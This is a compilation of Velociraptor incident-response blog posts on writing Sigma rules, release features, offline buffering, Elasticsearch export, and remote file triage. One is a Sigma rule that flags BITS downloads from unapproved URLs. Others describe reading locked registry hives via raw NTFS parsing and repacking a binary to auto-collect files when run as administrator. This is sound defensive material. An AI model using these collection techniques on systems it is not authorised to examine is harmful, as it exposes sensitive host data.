example `BITS started the Chrome Component Updater transfer job that
is associated with the XXX`.

I will extract the domain name part from the URL and group by it so I
can see all unique URLs collected.

![Narrowing down events of interest using stacking and filtering](narrowing_events.svg)

In practice I can collect a more representative set of these events by
collecting the artifact using a hunt (which can include the entire
deployment). This will give me a more representative set of download
URLs found in the environment so I can reduce false positives.

### Step 2: Developing rules with Sigma Studio

To effectively develop rules, one must be able to iterate quickly by
applying the rules against the collected events. To assist with this
process, I will use the `Sigma Studio` notebook template.

![Creating a new Sigma Studio Notebook](sigma_studio_1.svg)

Velociraptor notebooks are interactive documents allowing users to
dissect and analyse data using VQL. The `Sigma Studio` template is
specifically designed to make manipulation of Sigma Rules simpler.

![The Sigma Studio Notebook assists in writing rules](sigma_studio_2.svg)

The notebook has a number of important sections:

1. The Sigma Editor button launches a dedicated editor to edit Sigma rules.
2. By clicking the `Notebook Uploads` button you can upload the test
   events described in Step 1 above.
3. Once these raw events are uploaded to the cell, the bottom table
   will render the raw events, while the top table renders only those
   events matching the rules.


I will start off by uploading the test events I collected previously.

![Uploading test events](sigma_studio_3.svg)

#### Editing the Sigma Rules

I will launch the `Sigma Editor` by clicking on the button.

![Writing the Sigma rule](sigma_studio_4.svg)

Within the editor I select the `Windows.Sigma.Base` model. Next I
select the `bits-client` log source from the pull down. The editor
will show me available log sources within this model.

The editor displays so documentation about the log source and presents
a syntax highlighted Sigma text editor populated with a template
rule. For those not familiar with Sigma, comments help to guide the
user into filling in the desired fields.

For this detection, I will search for event ID 59, which reveal the
URL associated with the bits job. However, I will suppress jobs from
URLs accessing specific domains.

Pressing `?` will suggest any of the field mappings defined within
the model.

![Auto-Completion of Field Mappings](sigma_studio_5.svg)

In this case I know that `EventID` is a field mapping to extract the
log message's Event ID, and the `Url` field mapping will extract the
`url` field from the `EventData`

The rule I came up with is:

```yaml
title: Suspicious BITs Jobs
logsource:
 product: windows
 service: bits-client

detection:
 select_event:
   EventID: 59

 allowed_urls:
   Url|re:
    - edgedl.me.gvt1.com

 condition: select_event and not allowed_urls

details: "Bits Job %JobTitle% accessed URL %Url%"
```

* The rule consumes events from the `windows/bits-client` log source
  (which in this model ends up reading the events from the
  `C:\Windows\System32\WinEvt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx`
  log file.

* There are two selections:
   1. If the event id equal to 59
   2. Does the URL match one of the specified regular expressions

* Finally the rule will match only if the first selection is true and
  the second selection is false (i.e. only event 59 which do not match
  one of the allowed urls).

* The `details` field specified a message that will be emitted when
  the rule matches. This allows us to specify a simple human readable
  alert to explain what the rule has detected. You can add field
  interpolations enclosed in `%` to the message.

When I save the rule, the notebook will be refreshed and recalculated
using the new rule applied on the sample events I uploaded previously.

![Applying the rule to the test set](sigma_studio_6.svg)

You can see a detailed description of why the rule matched. For rules
with many selections and complex condition clauses this allows us to
inspect each condition in isolation.

#### Unavailable Field Mappings

Sigma strictly requires field mappings to already exist in the model
so they can be referenced. This makes it impossible to access fields
in the event which have not previously been defined within the model.

To solve this problem, Velociraptor's Sigma implementation allows, as
a special case, to use field names with `.` separating fields within
the event. The above rule can be written without any field mappings
as:

```yaml
title: Suspicious BITs Jobs
logsource:
 product: windows
 service: bits-client

detection:
 select_event:
   System.EventID.Value: 59

 allowed_urls:
   EventData.url|re:
    - edgedl.me.gvt1.com

 condition: select_event and not allowed_urls

details: "Bits Job %EventData.name% accessed URL %EventData.url%"
```

It is better to use model field mappings if they are already defined
in the model because this makes its easier to port the rule to other
models, however if one is not available you can fall back to this
method of referencing fields directly.

### Step 3: Test the rule on the fleet.

Now that we have a working Sigma rule we can apply this rule to the
wider fleet to assess the rule's false positive rate. As we apply the
rule more widely we are likely to discover more legitimate uses of the
BITS service and so we might need to add more URLs to the allow list.

![Creating a hunt to test the rule widely](testing_sigma_rules.svg)


![Viewing results from Sigma Hunt](sigma_hunt.svg)


## Conclusions

This Blog post explains the rational behind separating Sigma Rules
into `Sigma Models`. Velociraptor's Sigma implementation allows for
the creation of many specialized `Sigma Models` which can operate in
completely different environments.

For example, the `Windows.Sigma.Base` model operates on parsing of
event log files on the endpoint (triaging existing logs). On the other
hand the `Windows.Sigma.BaseEvents` model watches log files in real
time to generate Sigma based events on current activity.

Similarly the `Linux.Sigma.EBPF` model surfaces real time telemetry
collected from EBPF sensors on Linux and makes these available to
Sigma rule authors. This flexibility allows applying Sigma in many
different scenarios, making it a power technique.

The main difficulty with writing Sigma rules is being able to iterate
through generating event data, applying the Sigma Rule, debugging the
rule and testing the detection at scale.

This post describes a new Sigma rule writing workflow that allows to
rapidly iterate through the detection process, then apply the test to
the entire fleet quickly to test false positive rates.

---END OF FILE---

======
FILE: /content/blog/2025/2025-02-23-release-notes-0.74/_index.md
======
---
title: "Velociraptor 0.74 Release"
description: |
   Velociraptor Release 0.74 is available for testing

tags:
 - Release

author: "Mike Cohen"
date: 2025-02-10
noindex: false
---

I am very excited to announce that the latest Velociraptor release
0.74 is now in the release candidate (RC) status and available for
testing.

In this post I will discuss some of the new features introduced by
this release.

## GUI Improvements

This release improves a number of GUI features.

### Notebooks now receive typed parameters

Notebooks can now receive typed parameters and tools. This can be used
to create sophisticated notebooks which utilize external tools and
user parameters for post processing complex results.

For example, consider the new `Sigma Studio` notebook - a specialized
notebook designed to facilitate development of `Sigma` rules.

![Notebook templates can accept parameters](notebook_parameters.svg)

Notebook parameters can be modified at any time, where they are made
available to cells for recalculation. This allows notebook templates
to be interactive.

![Parameters can be modified at any time by pressing the Edit Notebook button](editing_notebook_parameters.svg)

### Expose the debug server to all admin users

Sometimes it is hard to know what is happening within Velociraptor -
this is especially the case when a large collection is made or a
complex query is added to the notebook.

Previously Velociraptor had a debug server which was accessible when
started with the `--debug` flag. The debug server exposes a lot of
internal state in order to help users understand what is going on.

However, adding another command line flag and exposing a new port
requires the server to be restarted which makes it hard to access this
debugging information.

In this release the debug server is always exposed in the GUI.

![Accessing the debug server from the GUI](accessing_debug_server.svg)

The debug server has a lot more interesting pages now. For example the
`Plugin Monitor` page shows which VQL plugins are currently in any
query and what parameters they were given.

![The running plugins show what plugins are currently running in any query](running_plugins.png)

The above shows the `glob()` plugin is currently searching the glob
`C:/Windows/**/*.exe` and had been for 7 seconds. This page provides
visibility as to what plugins are running slower than expected and
what they are doing.

Breaking it down even further the `GlobTracker` page shows the last 10
files visited by the `glob()` plugin. This is often critical to
understanding why a glob operation is slow, as sometimes the plugin
will visit many files and directory which do not match or are on a
remote network drive leading to long delays without evident progress.

![Seeing the last few files visited by the glob plugin above](glob_tracker.png)

There are many other debug pages including `ETW` tracking,
`ExportContainer` tracking the progress of zip export of hunts or
collections, `Client Monitoring Manager` reports status of client
monitoring queries and many more.

{{% notice tip "The debug server is still available with the --debug flag" %}}

While in this release the debug server is always present in the GUI,
the debug server is still available in other contexts as well. You can
still start the debug server on a client with the `--debug` flag and
similarly in the offline collector by starting it with
`VelociraptorCollector.exe -- --debug`

{{% /notice %}}

## Real time detection and monitoring

As Velociraptor is used more and more in real time detection
applications, Velociraptor's detection capabilities are maturing. We
are now using `Sigma` rules in many contexts, not just to triage
Windows Event logs, but also to match real time events from `eBPF` and
`ETW` as well as more traditional forensic artifacts.

### Sigma Studio

Velociraptor's `sigma()` plugin appeared in the previous release and
was improved greatly in this release. Previously Sigma rules were used
primarily for rapid triaging of Windows Events using the `Hayabusa`
rule set. A Curated set of rules are published on the Velociraptor
Sigma site at https://sigma.velocidex.com/ - these rules can be
automatically imported using the
[Server.Import.CuratedSigma](https://docs.velociraptor.app/artifact_references/pages/server.import.curatedsigma/)
artifact.

Previously it was difficult to write and test your own custom Sigma
rules. However in this release we introduced the concept of `Sigma
Models` - a preset collection of `Sigma log sources` that can be used
in particular contexts to write custom rules.

The GUI also introduces a new `Sigma Editor` which is used in the
`Sigma Studio` Notebook Template. These measure make it easy to write
or curate custom Sigma Rules.

To understand how all these components work together, read our new
blog post [Developing Sigma Rules in Velociraptor]({{% ref
"/blog/2025/2025-02-02-sigma/" %}})

### Linux eBPF support

Live detection using Sigma rules works well on Windows as we have a
good source of events with Sysmon or Windows event logs. For example
the
[Windows.Hayabusa.Monitoring](https://sigma.velocidex.com/docs/artifacts/velociraptor_hayabusa_event_ruleset/)
artifact uses the `watch_evtx()` plugin to follow event logs and match
them against the Hayabusa rule set in real time.

However for Linux we did not have a reliable live event
stream. Velociraptor previously had the `watch_auditd()` plugin to
receive `auditd` events but this was always clunky and hard to
configure.

In this release Velociraptor includes a full `eBPF` plugin based on
the excellent open source [tracee
project](https://github.com/aquasecurity/tracee). This given
unprecedented access to live system telemetry on Linux via VQL. Among
others some useful events include

- File operations with process information (open, delete, rename etc).
- Process Start/Stop.
- Network Connections (with process information).

You can see example events from the eBPF plugin in the [Linux Base
eBPF Model](https://sigma.velocidex.com/docs/models/linux_ebpf_base/)
page. These events are directly available now in Sigma rules so we can
monitor Linux endpoints in real time.

### Added support for the NT Kernel Logger ETW session

While on Linux we need an eBPF program to access system telemetry, on
Windows we can in theory use ETW as a built in way. Velociraptor had
the `watch_etw()` plugin for a long time, but we found that some
specialized ETW sources actually require a lot of processing before
they were directly usable.

On Windows there is a special ETW provider called the `NT Kernel
Logger` provider. This provider gives live events for many kernel
operations:

- Process Start/Stop events
- Module Load events (Linking dlls)
- Network Operations
- Registry keys

And many more. The provider can also provide stack traces for system
calls which may be useful in some detection scenarios.

Velociraptor now supports this provider for receiving real time
events. You can see some of the events provided in the [Windows Base
ETW Model](https://sigma.velocidex.com/docs/models/windows_etw_base/)
page explaining how to use those for Sigma detection rules.

This exciting capability brings Velociraptor into line with other open
source endpoint detection tools, for example
[Fibratus](https://www.fibratus.io/) uses this log provider almost
exclusively.

## VQL and Artifacts

This release also brings some improvements in Velociraptor's plugins
and artifacts.

### Added parse_pst() plugin and pst accessor

One commonly requested feature is support for `PST` files, usually
containing Outlook emails. This release introduces the `parse_pst()`
plugin which allows us to parse emails from a PST file as well as
extract attachments for Yara scanning.

### Artifact Verifier

As users start to build large corpus of custom artifacts, the need for
automated static analysis of VQL artifacts is increasing.

This release introduces the new `velociraptor verify` command. This
command scans a set of directories for VQL artifacts and uses static
analysis to find errors and highlight issues.

Currently the command employs the following checks:

- Checks the VQL syntax is correct
- Ensures that plugins and function that are called in VQL actually
  exist - this flags common errors like using a VQL plugin where a
  function is needed etc.
- Ensures plugins are called with the correct arguments. This flags
  common errors like passing a plugin a deprecated argument or
  accidentally calling a plugin with the wrong parameter.
- Ensures that dependent artifacts are called correctly - i.e. the
  artifacts define the parameters that are being called.

This command is intended to run inside a Continuous integration (CI)
pipeline as a presumbit check for artifact correctness.


## Conclusions

There are many more new features and bug fixes in the latest
release. Please download the release candidate and give it a test and
provide feedback.

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2019/2019-09-11_velociraptor-s-client-side-buffer-3ce03697a4e6/_index.md
======
---
title: Velociraptor’s client side buffer
description: >-
  The recent velociraptor release features a client side buffer. What does this
  do and how does it change the incident response field?
date: '2019-09-11T00:31:39.482Z'
categories: []
keywords: []
---

#### By Mike Cohen

![](../../img/1__SLf0Z8PXOXTWfjXyuTk__Xg.png)

The recent [Velociraptor](https://www.velocidex.com/) [release](https://github.com/Velocidex/velociraptor/releases) (0.3.3) features a client side buffer. What does this do and how does it change Velociraptor’s approach to incident response?

### What is a local buffer?

The Velociraptor client is really just a (Velociraptor Query Language) VQL execution engine. When collecting an artifact, the client running on the endpoint, simply executes the VQL and streams rows from the query to the server as they occur.

Previously the client would attempt to upload the rows periodically to the server, and while this upload was taking place, the VQL query was paused. If the server was unavailable (for example if the endpoint was not on the internet), the VQL query simply paused until the rows could be sent.

In the recent 0.3.3 release we introduced a local file buffer between the execution engine and the server communication thread. Now the Velociraptor client’s VQL engine operates independently of the communication thread, and is not paused if the server is not reachable. This is illustrated in the diagram below:

![](../../img/1__6BhCwfeFhoO0Jf4UP3g25Q.png)

By default the file on disk is allowed to grow to 1GB in size, but usually it is truncated to zero bytes if the client is online and communicating with the server.

### What does a buffer file allows us to do?

Using a file on disk allows us to run the VQL query as quickly as possible. For example, some artifacts require collection of many files. Since network traffic is typically much slower than disk activity, previously we were only able to collect data at the speed at which we could send it on the network. An artifact collection could take quite some hours if there was a lot of data to upload and a slow network link.

With the new system we are allowed to buffer up to 1GB of data (which also includes uploaded files) before we have to pause the query. This allows many artifacts to completely finished — even if the client is not online. Later when then client resumes connection with the server, that data can be uploaded over time — even if the network is very slow.

### Event Monitoring queries

One of the differences between Velociraptor and other tools is that VQL queries allow us to build a complete monitoring and response framework.

Typically EDR tools deploy sensors which collect data and feed it to a back-end system. Processes on the back-end system detect anomalous activity and respond to this either by gather more information or alerting. This long latency round trip between detection and response delays the response activity and is only possible when the client is connected and online.

With the recent Velociraptor release, we can deploy monitoring VQL artifacts which simply watch the endpoint for certain events. These events can then be automatically acted upon — typically to implement response actions (e.g. kill a bad process) or to enrich the event information collected (e.g. acquire extra hashes or the binaries of suspicious files).

Because the file buffer allows the VQL engine to operate even when the client is not online, VQL event monitoring queries are not interrupted and continue to work autonomously without involvement from the server.

#### Example: Office macros on thumb drive

An example of an event monitoring artifact is the **Windows.Detection.Thumbdrives.List** artifact. This artifact watches for any newly inserted USB thumb drive and simply lists the files on it. In some environments it is interesting to see any newly added files on a USB removable drive.

![The Windows.Detection.Thumbdrives.List artifact watches for newly added removable drives and reports new files added to them.](../../img/0__nPIixkbpqm__LNbv2.jpg)
The Windows.Detection.Thumbdrives.List artifact watches for newly added removable drives and reports new files added to them.

Previously, when a thumb drive was added, Velociraptor sent the file listing to the server immediately. However, if the endpoint was offline, this data blocked further monitoring by the query.

Starting with the 0.3.3 release, Velociraptor will now queue the messages in its local file buffer immediately, and transfer the data to the server when it can — even if it is currently not on the internet or online. The messages will simply be forwarded to the server at a later time.

#### Conclusions

This feature allows Velociraptor to monitor the end point without being connected to the server at all. In effect this implements a **response plan**: The endpoint is given a plan of what to do in the case certain events occur (in the form of monitoring VQL queries) and can implement this plan autonomously without needing to contact the server.

---END OF FILE---

======
FILE: /content/blog/2019/2019-10-04_triage-with-velociraptor-pt-2-d0f79066ca0e/_index.md
======
---
title: Triage with Velociraptor — Pt 2
description: "Help others to collect files\_…"
date: '2019-10-04T23:50:52.556Z'
categories: []
keywords: []
---

#### By Mike Cohen

![](../../img/1__mBMHcMkKxXbyuJcMiGJ1LA.jpeg)

In the [previous part](https://medium.com/@mike_89870/triage-with-velociraptor-pt-1-253f57ce96c0) of this series of articles we saw how Velociraptor can be used to automatically collect and preserve files from a remote system. This is great if you have Velociraptor installed as an agent on the endpoint — but what if you (or your customer) does not?

#### Interactive collection

Velociraptor is essentially a query engine. All its operations are controlled by VQL queries normally encapsulated in a YAML files called artifacts. As such it does not really need a server to operate. It is possible to collect those same artifacts interactively on the command line (In this example we collect the KapeFiles artifact as we did in the last part but you can collect any Velociraptor artifact this way):

```
F:> velociraptor.exe -v artifacts collect Windows.KapeFiles.Targets --output test.zip --args RegistryHives=Y
```

Invoking Velociraptor with the **artifacts collect** command specifies that we should collect the artifact interactively. If we also specify the “ **—-output** ” flag we will collect the result into the zip file. We can then specify any argument to the artifact using the “**—-args**” flag (which may be specified more than once). If you can not remember which args the artifact takes then simple provide and incorrect arg for Velociraptor to tell you.

The example above simply collects all registry hives on the system (Registry hives are typically locked but Velociraptor uses raw NTFS parsing to extract the files from the filesystem — thus bypassing all locks).

![](../../img/1__80qDOPpgzzmmBOo8Pf4sFQ.png)
![](../../img/1__A37UEKRaWFP297xls0iEJw.png)

#### Help someone else collect files

Sometimes in our DFIR work we need to rely on other’s help — sometimes a system administrator or even an end user with limited command line skills. It is unreasonable to expect all our helpers to be able to type the above command line. We need to make it as easy as possible for our accomplices.

Velociraptor features a method for packing a configuration file within the binary itself. We can use this feature to have Velociraptor automatically execute the correct artifact collection when started without any parameters (or double clicked).

Simply create a configuration file with an autoexec field containing all the command line args (let’s call it **myconfig.yaml** ):

```
autoexec:
  argv: \["artifacts", "collect", "-v", "Windows.KapeFiles.Targets",
         "--output", "collection\_$COMPUTERNAME.zip",
         "--args", "WebBrowsers=Y",
         "--args", "\_BasicCollection=Y",
         "--args", "WBEM=Y",
         "--args", "WER=Y",
         "--args", "WindowsDefender=Y",
         "--args", "TrendMicro=Y",
         "--args", "TeamViewerLogs=Y",
         "--args", "WebBrowsers=Y",
         "--args", "MOF=Y",
         "--args", "VSSAnalysis=Y"\]
```

Note that this config file invokes Velociraptor with a list of KapeFiles targets and instructs the result to be saved to a zip file named after the computer name.

Next we simply repack the binary — this effectively copies the config file inside the binary so when the new binary restarts, it automatically loads this config file (and therefore runs the instructions above):

```
F:> velociraptor.exe config repack myconfig.yaml my\_velo.exe
```

This will produce a new binary with our config embedded in it. Now when this binary is run it will immediately begin to collect the targets listed. Note that the collector needs to run as an administrator so typically the user will need to right click, select “Run As Administrator” and click through the UAC dialog:

![](../../img/1__qfSv52u3RLwpoOBqSz1lCg.png)

When complete Velociraptor will leave behind the zip file with all the files in it — ready for sharing with the investigator.

#### Uploading the collection

All we need to do now is send our trusted user the repacked binary and instruct them to right click on it and run as administrator. The collected zip file can be large (several Gb) and the user would need to somehow transport the file to us. One way is for us to set up a public writable share and have the file written automatically via a UNC path. This method only works when users are on the corporate LAN and have access to the domain and the file share. Otherwise the user may upload the file manually for us.

In the next part we will see how to write the collected zip file to a cloud server instead so they can automatically upload the collected files from any internet connected network.

---END OF FILE---

======
FILE: /content/blog/2019/2019-12-08-velociraptor-to-elasticsearch-3a9fc02c6568/_index.md
======
---
title: Velociraptor to Elasticsearch
description: Velociraptor to Elasticsearch
date: '2019-12-08T23:50:52.556Z'
---

## Taking your data elsewhere…

#### By Justin Welgemoed

![](../../img/1_mAd_VmUqHkyZgz-hCL2ctQ.png)

Since release 0.3.5 Velociraptor includes an Elastic VQL plugin plus two built-in server artifacts that demonstrate how to make use of this plugin.

## Set your data free!

Velociraptor is great at collecting oceans of information from a vast fleet of client machines but that information is, by default, only stored locally on the Velociraptor server.

In a typical deployment, responders and analysts tend to either…

* use the VR GUI to browse/search the collected data, or

* download/retrieve the data in the form of CSV or JSON files and work with it manually, possibly through an automated sequence of “post-processing” steps.

* query the data via the Velociraptor API

The problem is that beyond the simplest deployment scenarios these approaches run into limitations pretty quickly due to [the 3 Vs](https://hackernoon.com/the-3-vs-of-big-data-analytics-1afd59692adb) (Velocity, Variety & Volume) of data in modern IT environments. By design Velociraptor is a high-performance data collection tool and doesn’t intend to be an information management or analytics tool. For short-term/temporary deployments the included data management capabilities may be quite sufficient but for long-term/permanent deployments we don’t want our data to be so self-contained. We want to scale easily and reap the benefits of correlating our VR data with other security data sources, for example firewall/IPS logs and other detection systems.

In the DFIR and InfoSec world many popular tools rely on the [Elastic Stack](https://www.elastic.co/products/) to provide backend storage and analytics capabilities rather than reinventing the wheel in that regard. Having the data in Elasticsearch means that you can apply your standard analytics tools and techniques without much concern for the origin of the data, and thus have a unified view of data from a variety of disparate sources.

Velociraptor supports this information management approach by providing out-of-the-box Elastic plugin and two VQL artifacts which together provide the capability of sending data to Elasticsearch.

## Sending Flows to Elastic

The first VQL artifact that we will use to accomplish our goal is named *Elastic.Flows.Upload*

This artifact sends the results of [Flows](https://www.velocidex.com/docs/user-interface/artifacts/client_artifacts/) to Elasticsearch. It’s the easiest one to get started with because all you have to do is add the artifact to [Server Monitoring](https://www.velocidex.com/docs/user-interface/artifacts/server_events/) and tweak a parameter or two if necessary.

![This is where Server Monitoring artifacts are hidden!](../../img/1_iDsgXuKmszwthN8EX8AHsw.png)*This is where Server Monitoring artifacts are hidden!*

As you can see in the screenshot below, the default parameters will work if you have Elasticsearch installed locally and listening on the default IP and port.

![](../../img/1_AUrPhobirbEaekF0fK3Jow.png)

If not then you can easily change these details to match your environment. The artifact parameter named *ArtifactNameRegex* defaults to including the flow results from ***all*** artifacts. If you don’t want the output of all artifacts to go to Elastic then here you can also specify a subset of artifact names using a crafty regex.

Once you’ve added the *Elastic.Flows.Upload *artifact to Server Monitoring you can now kick off a flow or two to generate some data. Then go look in Elastic (via Kibana of course, but remember to first create a suitable index pattern so that you can see the data! An initial Kibana index pattern of “*artifact_**” will have you covered.)

![Whoa! It actually worked!](../../img/1_MWEk71L6_mBkmpq999ihJA.png)*Whoa! It actually worked!*

You’ll notice that the Elastic index name is based on the Velociraptor client artifact name. So if you prefer, you can create distinct Kibana index patterns that will allow you to view and search through only a single artifact type at a time.

Expanding the view for a single document you should see something like this:

![](../../img/1_ozK_r9SyG-3BLMUYQM82gg.png)

And that’s how easy it is to get your data into Elastic!

{{% notice note %}}
If you have an Elasticsearch cluster that uses authentication, non-standard ports or other customizations, you can create a custom artifact by copying the **Elastic.Flows.Upload** artifact and adding [additional parameters](https://github.com/Velocidex/velociraptor/blob/4d19d37191500b5f01f064586f8940a4b1a5dccf/vql/server/elastic.go#L56) to it in order to make it suit your non-standard environment.
 {{% /notice %}}

## Sending Client Events to Elastic

This is slightly less easy than the previous step but only because it requires that you first configure one or more artifacts to collect [client events](https://www.velocidex.com/docs/user-interface/artifacts/client_events/).

Once the client events are being collected and received by the VR server, the *Elastic.Events.Clients* artifact will take care of forwarding these events to Elastic *.*

The artifact supports forwarding events from 4 built-in client event artifacts by default. These client event types can be selected/deselected and with a bit of customization even more types can be added to suit your needs:

* Windows.Detection.PsexecService
* Windows.Events.DNSQueries
* Windows.Events.ProcessCreation
* Windows.Events.ServiceCreation

![](../../img/1_tsp_GZaSQBuVNDcWdU0TXw.png)

To get the client events flowing to Elastic we must add the *Elastic.Events.Clients *artifact to Server Monitoring, just as we did with the *Elastic.Flows.Upload* artifact in the previous section.

![Select the Client Artifacts that you are **already** collecting](../../img/1_CjlQuXfmG0YrsaGtB7wlUw.png)*Select the Client Artifacts that you are **already** collecting*

When adding the artifact make sure to select the client event types that you would like to have forwarded. Also configure the Elastic IP:port. If your Elastic server needs further options than are available in the artifact parameters then simply create a copy of the *Elastic.Events.Clients* artifact and add the additional [options](https://github.com/Velocidex/velociraptor/blob/4d19d37191500b5f01f064586f8940a4b1a5dccf/vql/server/elastic.go#L56) to the custom artifact.

As before, we now go to Kibana to check out the results…

![Are you tired of winning yet?](../../img/1_4-AlVbICs9O_hUjKBSNung.png)*Are you tired of winning yet?*

Easier than you expected, right? Well in the next section we take it to the next level by bringing Logstash into the loop. Let’s put the L into the E**L**K Stack…

## Slice & Dice with Logstash

Want to reshape, filter or enrich the data? Well you could do that by writing custom Velociraptor artifacts, however you might already have an existing data pipeline that includes Logstash. This is a common architecture in information security environments where Logstash provides centralised flow control, data enrichment and standardization functions prior to the data being fed into Elasticsearch.

While Velociraptor doesn’t directly support Logstash, integration can be achieved by making Logstash emulate the Elasticsearch Bulk API. To make this work you’ll need to install the Logstash [ES_bulk codec plugin](https://www.elastic.co/guide/en/logstash/current/plugins-codecs-es_bulk.html), since this is not one of the pre-installed plugins.

A very simple Logstash Input configuration which uses that additional plugin, in conjunction with the Logstash HTTP Input plugin, will set up the desired Elastic emulation:

<script src="https://gist.github.com/predictiple/a78dad17a459294d40a6d953df14f2a0.js"></script>

With the above in place Velociraptor will think it’s talking to Elastic’s Bulk API so the configuration steps described in the previous sections all remain equally applicable and unchanged in this scenario. No special configurations are required on the Velociraptor side.

Now you can do all the data reshaping/filtering/enriching that your heart desires within Logstash and then have it pass that data on to Elastic!

## Conclusions

By integrating Velociraptor with the mature and widely-adopted Elastic
Stack we can achieve significant scalability benefits. This also means
that Velociraptor data can be made available to analysts who may not
have the time or inclination to learn yet another tool. Having the
data in Elastic also allows us to leverage the many excellent analysis
and detection tools that have blossomed around the Elastic ecosystem,
as well as make use of existing organizational expertise in these
tools. The data can furthermore be enriched, combined and correlated
with data from a wide variety of security tools that make use of
Elastic as a data backend.

---END OF FILE---

======
FILE: /content/blog/2019/2019-10-02_triage-with-velociraptor-pt-1-253f57ce96c0/_index.md
======
---
title: Triage with Velociraptor — Pt 1
description: Collecting files for fun and profit
date: '2019-10-02T13:32:39.822Z'
categories: []
keywords: []
---

#### By Mike Cohen

![](../../img/1__8JNwZw22dHvjNnRAKqFz2g.jpeg)

This is part 1 of the 3 part series focused around triaging and file collection.

Traditionally digital forensic practitioners and incident responders collected disk images to retain evidence in cases of compromise. However in recent times, the size of investigations and the short time frames required, started a trend of more selective evidence collection. Instead of collecting the entire disk, responders now prefer to collect only critical files allowing more rapid triage.

However, which files should we collect? Knowing which files to collect and what to do with them was previously reserved for DFIR experts. These days, we have some excellent public resources for this. The best resource for windows systems is probably the [KapeFiles](https://github.com/EricZimmerman/KapeFiles) repository. This is a public repository maintaining a set of [Kape](https://ericzimmerman.github.io/KapeDocs/#!index.md) configuration files. Kape is an excellent tool geared at file collection — simply acquiring various files of interest from a system for triage purposes.

Although Kape itself is not open source, the KapeFiles repository is a community project available under the MIT license. It therefore seemed like a perfect way to leverage the specialist DFIR knowledge from the community and develop a useful Velociraptor artifact based on this knowledge.

This article outlines this new artifact and how it can be used to collect triaged files quickly and efficiently.

#### The KapeFiles repository

Kape parses a set of **Target** files (with **.tkape** extension). These files essentially specify a set of file globs (i.e. paths with wild cards) specifying files to collect. Kape also supports targets referring to other targets thereby expressing higher level targets in terms of lower level targets. For example selecting the **WebBrowsers.tkape** target, will include all glob expressions specified in **Chrome.tkape, FileFox,tkape** etc.

When using Kape to collect files, the user specifies one or more **Targets** which are then collected into a directory, or some container (e.g. Zip file).

Previous versions of velociraptor added several VQL artifact definitions based on the KapeFiles repository, but these were hand written and difficult to maintain in sync with the public contributions to the KapeFiles repository.

Since [release 0.3.4,](https://github.com/Velocidex/velociraptor/releases/tag/v0.3.4) Velociraptor has a script that automatically parses out Kape target files and generates a Velociraptor artifact with the same targets and globs — thereby creating a functionally equivalent artifact to the KapeFiles repository.

#### Collecting files from the endpoint

To collect files, simply select the **Windows.KapeFiles.Targets** artifact from the **Collected Artifacts** screen in the GUI. After adding the artifact to our collection (by clicking **Add**) we see a list of targets with check boxes next to them. Each target may invoke several rules (and therefore collect different files), but the dependencies are listed next to the target.

![Selecting the Windows.KapeFiles.Targets artifact for collection on an endpoint.](../../img/1__9OLhR0z9EbEPbIBY9Dv3aQ.png)
Selecting the Windows.KapeFiles.Targets artifact for collection on an endpoint.

Selecting one or more targets will collect those files from the endpoint to the Velociraptor server. Once the files are fully collected to the server, you can download them as a zip file on demand by clicking the “Prepare Download” button.

![](../../img/1__T7To9XETRYO3R7jP__U1mSg.png)

When the collection is complete, we can click the _“Prepare Download”_ button which will prepare a Zip file on the server for us to download.

#### Triaging a system

What can we use this for? Suppose you suspect a compromise. It is imperative to preserve as much of the evidence as possible, as quickly as possible.

Running the Kape target **BasicCollection** will collect a lot of interesting files, including the **$MFT**, **event logs**, **prefetch**, **amcache** among many other files. This helps us to preserve as much of the state of the system as we think will be relevant for our investigation in future.

Depending on the total amount of data collected we may also issue this collection on one or more machines. Triaging will capture and preserve the evidence. We can then parse it with other tools externally and just keep the snapshot.

#### What if Velociraptor is not installed on our endpoints?

If Velociraptor is not installed on the endpoint, we have a number of options:

1.  [Install it](https://www.velocidex.com/docs/getting-started/deploying_clients/) using group policy
2.  Temporarily run it using group policy scheduled tasks (so called [Agentless mode](https://www.velocidex.com/docs/getting-started/deploying_clients/#agentless-deployment))
3.  Interactively collect triaging files by running in interactive mode.

The [next part](https://medium.com/velociraptor-ir/triage-with-velociraptor-pt-2-d0f79066ca0e?source=friends_link&sk=b3b902227634160e0f9703338fb25586) of this series will discuss how to interactively collect triage files while physically (or remotely) logging into the machine.

---END OF FILE---

======
FILE: /content/blog/2019/2019-10-08_triage-with-velociraptor-pt-3-d6f63215f579/_index.md
======
---
title: Triage with Velociraptor — Pt 3
description: Collecting files to the cloud…
date: '2019-10-08T09:03:34.890Z'
categories: []
keywords: []
---

#### By Mike Cohen

![](../../img/1__AN0KYVpqc581I2OYcKQ0zg.jpeg)

This is the final part of this three part series of articles
describing how to use Velociraptor to collect files from an
endpoint. Our [first
part](https://medium.com/@mike_89870/triage-with-velociraptor-pt-1-253f57ce96c0)
shows how we can use the Velociraptor agent in a typical client/server
setting to collect artifacts from one or many endpoints at the push of
a button, within seconds.

[Part
two](https://medium.com/@mike_89870/triage-with-velociraptor-pt-2-d0f79066ca0e)
examined what to do if Velociraptor is not already installed as an
agent (or can not be remotely installed). In this case we used an
accomplice user with administrator privileges (or group policy) on the
endpoint to run the collector interactively — producing a zip file
with the triage material within it. We left the task of transporting
the file back to the investigator up to the user though. Ideally we
would like to have an automated way in which the files can be
transported back to us.

This article continues this theme: we devise a way for the collected
file to be uploaded to a cloud storage bucket. We will write a new
Velociraptor artifact with this functionality, leveraging the
previously described collection artifact. It is a good example of how
we may customize artifact collection in a flexible way adding
arbitrary functionality to Velociraptor as we go along.

#### Setting up Google Cloud Bucket for uploading.

Before we can upload files to a bucket we need to have a project in
place. For this example I created a new project called
“velociraptor-demo”:

![Create a new project](../../img/1__1DXiwQ4__gqzaYMZKSMxAfg.png)
Create a new project

Our plan is to distribute to our accomplices the packed binary as
before, but this time we want Velociraptor to automatically upload
results for us into our bucket.

In order to do this we need a service account with credentials
allowing it to upload to our bucket. Go to **IAM & Admin / Service
Accounts / Create Service Account:**

![](../../img/1__ZG9riz0ViCT8PgILXHuU7Q.png)

Since the service account will be able to upload by itself (i.e. the
user does not authenticate on its behalf), we need to identify it with
a JSON key. The key allows Velociraptor to act as the service account
